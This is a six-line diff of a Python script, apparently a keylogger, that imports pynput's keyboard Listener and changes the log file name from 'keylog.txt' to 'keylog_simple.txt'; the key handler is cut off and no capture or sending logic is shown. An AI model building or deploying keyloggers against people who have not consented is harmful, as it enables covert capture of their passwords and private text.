@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 
-log_file = "keylog.txt"
+log_file = "keylog_simple.txt"
 
 
 def on_press(key):
